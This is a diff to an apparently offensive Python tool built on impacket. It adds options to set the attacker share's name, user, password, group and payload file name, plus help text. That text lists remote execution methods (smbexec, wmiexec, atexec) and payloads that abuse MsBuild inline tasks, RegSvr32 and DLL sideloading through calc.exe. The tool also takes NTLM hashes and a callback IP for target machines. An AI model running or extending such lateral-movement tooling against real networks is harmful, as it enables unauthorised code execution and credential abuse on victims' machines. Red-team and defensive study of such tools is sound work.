@@ -20,6 +20,8 @@ import netifaces as ni
 from base64 import b64encode
 from datetime import datetime
 from pebble import ProcessPool
+from argparse import RawTextHelpFormatter
+
 
 from six import PY2
 from impacket import version
@@ -950,11 +952,30 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array)
 
 
 def setup_share():
-    share_name = ''.join(random.choices(string.ascii_lowercase, k=20))
-    share_user = ''.join(random.choices(string.ascii_lowercase, k=10))
-    share_pass = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=35))
-    payload_name = ''.join(random.choices(string.ascii_lowercase, k=10))
-    share_group = ''.join(random.choices(string.ascii_lowercase, k=10))
+    if options.sharename is None:
+        share_name = ''.join(random.choices(string.ascii_lowercase, k=20))
+    else:
+        share_name = options.sharename
+
+    if options.shareuser is None:
+        share_user = ''.join(random.choices(string.ascii_lowercase, k=10))
+    else:
+        share_user = options.shareuser
+
+    if options.sharepassword is None:
+        share_pass = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=35))
+    else:
+        share_pass = options.sharepassword
+        
+    if options.payloadname is None:
+        payload_name = ''.join(random.choices(string.ascii_lowercase, k=10))
+    else:
+        payload_name = options.payloadname
+
+    if options.sharegroup is None:
+        share_group = ''.join(random.choices(string.ascii_lowercase, k=10))
+    else:
+        share_group = options.sharegroup
 
     print("\n[Generating share]")
     # making the directory
@@ -1232,7 +1253,7 @@ if __name__ == '__main__':
     print(reaper_banner)
     print(version.BANNER)
 
-    parser = argparse.ArgumentParser(add_help=True, description="")
+    parser = argparse.ArgumentParser(add_help=True, description="", epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs', formatter_class=RawTextHelpFormatter)
     if '-oe' not in sys.argv:  # if were using another exec method we dont need to get target
         parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
     parser.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$) (wmiexec ONLY)')
@@ -1245,6 +1266,7 @@ if __name__ == '__main__':
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
     parser.add_argument('-method', action='store', default='smbexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
     parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'dllsideload', 'exe'], help='Choose a payload type')
+    parser.add_argument('-payloadname', action='store', help='Set the name for the payload file')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                        '"%s"). If errors are detected, run chcp.com at the target, '
@@ -1254,6 +1276,12 @@ if __name__ == '__main__':
     parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION", help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
     parser.add_argument('-service-name', action='store', metavar="service_name", default=SERVICE_NAME,
                         help='The name of the service used to trigger the payload (SMBEXEC only)')
+
+    parser.add_argument('-sharename', action='store', help='Set the name of the attacker share')
+    parser.add_argument('-shareuser', action='store', help='Set the username of the user for the share')
+    parser.add_argument('-sharepassword', action='store', help='Set the password for shareuser')
+    parser.add_argument('-sharegroup', action='store', help='Set the group for shareuser')
+
     group = parser.add_argument_group('authentication')
     group.add_argument('-localauth', action='store_true', default=False, help='Authenticate with a local account to the machine')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH or just NTHASH')
@@ -1269,6 +1297,7 @@ if __name__ == '__main__':
     group.add_argument('-A', action="store", metavar="authfile", help="smbclient/mount.cifs-style authentication file. "
                                                                       "See smbclient man page's -A option.")
     group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
+
 
     if len(sys.argv) == 1:
         parser.print_help()
